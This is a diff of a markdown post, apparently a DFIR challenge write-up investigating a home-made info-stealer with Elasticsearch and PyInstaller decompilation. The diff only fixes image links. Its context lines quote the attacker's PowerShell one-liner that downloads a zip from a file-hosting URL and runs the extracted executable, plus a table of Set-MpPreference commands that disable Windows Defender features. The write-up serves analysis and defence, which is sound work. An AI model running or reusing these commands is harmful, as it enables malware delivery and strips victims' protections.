@@ -78,10 +78,10 @@ Your SOC Manager.
 
 And we gained access to an Elasticsearch instance to work with. I know that the incident occurred on **02/17/2025** and check the alerts from that time as a starting point.
 
-![](/assets/images/posts/2025-02-21-Homemade_Lumma Stealer/01.png)01.png]]
+![](/assets/images/posts/2025-02-21-Homemade_Lumma Stealer/01.png)
 So, we have a single machine (the victim's machine) and three different types of alerts. There are still too many alerts to work with, so I will try to narrow them down. I will filter for only **"Process Execution from an Unusual Directory"** since that should provide a good lead to start with.
 
-![](/assets/images/posts/2025-02-21-Homemade_Lumma Stealer/02.png)02.png]]
+![](/assets/images/posts/2025-02-21-Homemade_Lumma Stealer/02.png)
 
 We can see that four alerts occurred around 11 o’clock and another four around 15 o’clock. Since the manager mentioned that the incident happened at **"2/17/2025 3:00 something Cairo time,"** I will narrow the timespan I examine to start from 15 o’clock. Additionally, we need to be aware that the alert timestamps are in Cairo time.
 
@@ -89,23 +89,23 @@ Six of the alerts are related to a process named `exec.exe`, and the first alert
 
 Inspecting the alert related to `pretty_normal_file_x64.exe`, we see this:
 
-![](/assets/images/posts/2025-02-21-Homemade_Lumma Stealer/03.png)03.png]]
+![](/assets/images/posts/2025-02-21-Homemade_Lumma Stealer/03.png)
 
 
 The executable named `pretty_normal_file_x64.exe` ran from the user `Public` desktop, which is indeed an unusual directory. I will try to create a timeline, so it is important to document the timestamp of each action. The alert was triggered at `2025-02-17T15:52:08.768Z`, and from the JSON tab, there is a field called `event.created`, which indicates that the actual process execution event was created at `2025-02-17T15:49:20.928Z`. The timestamps in the JSON tab are in UTC, but I will stick with Cairo time.
 
 But how did this executable reach the machine in the first place? I will look for events where this executable appears. To do so, I will create a new `visualization`, set it to be `aggregation-based`, and choose `Data table`. I will start by identifying which log files contain this executable using the `Split row` option:
 
-![](/assets/images/posts/2025-02-21-Homemade_Lumma Stealer/04.png)04.png]]
+![](/assets/images/posts/2025-02-21-Homemade_Lumma Stealer/04.png)
 
 This should be our reference when we want to look into specific events. I couldn't confirm it 100%, but `system.security` and `winlog.winlog` appear to be identical, so I will use `system.security` only.
 Now, I want to see which log files contain `pretty_normal_file_x64.exe`:
 
-![](/assets/images/posts/2025-02-21-Homemade_Lumma Stealer/05.png)05.png]]
+![](/assets/images/posts/2025-02-21-Homemade_Lumma Stealer/05.png)
 
 I will look into `windows.powershell_operational` in `Discover`, and here is what I found:
 
-![](/assets/images/posts/2025-02-21-Homemade_Lumma Stealer/06.png)06.png]]
+![](/assets/images/posts/2025-02-21-Homemade_Lumma Stealer/06.png)
 I toggled the field `powershell.file.script_block_text` to appear as a column. We found a single value for the executed script:
 ```powershell
 $uR = 'https://files.catbox.moe/edhauf.zip'; $dL = 'C:\Users\Public\Desktop\I am Arthur Morgan.zip'; Invoke-WebRequest -Uri $uR -OutFile $dL -UseBasicParsing; $extractPath = 'C:\Users\Public\Desktop\A legitimate software'; Expand-Archive -Path $dL -DestinationPath $extractPath -Force; Start-Process -FilePath 'C:\Users\Public\Desktop\A legitimate software\pretty_normal_file_x64.exe';
@@ -139,7 +139,7 @@ Anyways, if one day if you know someone who can help me encrypt data make them D
 
 We will get to that note later. I want to know more the executable so I will start with [DIE](https://github.com/horsicq/DIE-engine/releases)
 
-![](/assets/images/posts/2025-02-21-Homemade_Lumma Stealer/08.png)08.png]]
+![](/assets/images/posts/2025-02-21-Homemade_Lumma Stealer/08.png)
 
 So, the executable is packed with `PyInstaller`. I will attempt to extract the bytecode and then decompile it:
 
@@ -234,11 +234,11 @@ Lucky for us ARTHUR don't like spaghetti and wrote a clean code. There are four 
 
 Here is the [report](https://www.hybrid-analysis.com/sample/2a90c14a30e0f54824c26cf3d50688a217ef476c2cdd4f402c5762e4cae61022/67b5c03403f48def080c0f91) for dynamic analysis on `hybrid-analysis.com`. What I find odd about that report is there is no network activity nor the zip file created, that is a good reason to not rely completely on automated dynamic malware analysis. 
 
-![](/assets/images/posts/2025-02-21-Homemade_Lumma Stealer/09.png)09.png]]
+![](/assets/images/posts/2025-02-21-Homemade_Lumma Stealer/09.png)
 
 Another [report](https://app.any.run/tasks/6aba0ec8-3c36-4cd9-8355-ceb0b1c6cfe8) from `any.run`. Note that there is no created zip files nor dns requests made to the malicious domain
 
-![](/assets/images/posts/2025-02-21-Homemade_Lumma Stealer/10.png)10.png]]
+![](/assets/images/posts/2025-02-21-Homemade_Lumma Stealer/10.png)
 
 ## Defence Evasion 
 
@@ -270,7 +270,7 @@ It carry a list of commands and these PowerShell commands weaken Windows Defende
 | `Set-MpPreference -DisableIntrusionPreventionSystem $true` | **Disables network-based attack prevention**, making the system more vulnerable.                                                                            |
 | `Set-MpPreference -DisableScriptScanning $true`            | **Disables script-based malware detection**, allowing malicious PowerShell or JavaScript to execute freely.                                                 |
 Previously we got `pretty_normal_file_x64.exe` PID and it is `6920` we will use it to see child process for it. 
-![](/assets/images/posts/2025-02-21-Homemade_Lumma Stealer/12.png)12.png]]
+![](/assets/images/posts/2025-02-21-Homemade_Lumma Stealer/12.png)
 
 It spawned itself again. I will retrieve the child process ID (PID) and filter using it. The PID for the child process is `1640`, and filtering with it gives:
 
